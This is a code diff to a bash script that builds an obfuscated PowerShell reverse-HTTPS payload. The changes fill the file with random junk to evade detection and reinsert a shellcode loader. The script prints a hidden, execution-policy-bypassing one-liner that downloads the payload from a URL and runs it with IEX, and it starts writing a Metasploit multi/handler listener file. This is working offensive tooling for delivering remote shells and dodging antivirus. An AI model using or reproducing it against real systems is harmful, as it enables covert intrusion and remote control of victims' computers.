@@ -105,19 +105,22 @@ declare "junk_string"="#$(cat /dev/urandom | tr -dc '(\&\_a-zA-Z0-9\^\*\@' | fol
 printf "DEBUG Junk string:\n"
 printf "$junk_string\n"
 
-# fill every line with junk string
+# fill every empty line with junk string
 printf "DEBUG Filling final_pshnet_revhttps.ps1 with junk...\n"
 sed -i -e "s,^,$junk_string\n," final_pshnet_revhttps.ps1
 
-# insert loader back
+# insert loader back and fill with junk a bit before it
 printf "DEBUG inserting loader back...\n"
 sed -i "/Set-StrictMode -Version 2/r loader.txt" final_pshnet_revhttps.ps1
-
+for (( z=0; z <=$shellcode_parts; z++))
+do
+    sed -i "2i $junk_string" final_pshnet_revhttps.ps1
+done
 
 printf "Final psh-net usage example:\n"
 printf "powershell.exe -Window Hidden -Nop -Exec Bypass -C \"\$nwc=(New-Object Net.WebClient);\$nwc.Proxy=[Net.WebRequest]::GetSystemWebProxy;\$nwc.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IWR('$DownloadURL/final_pshnet_revhttps.ps1') -UserAgent $UserAgent|IEX\"\n"
 
-# create multu handler listener file
+# createing multu handler listener file
 printf "Creating multi handler script file...\n"
 printf "use exploit/multi/handler\n" > multihandler.rc
 printf "set PAYLOAD $payload\n" >> multihandler.rc
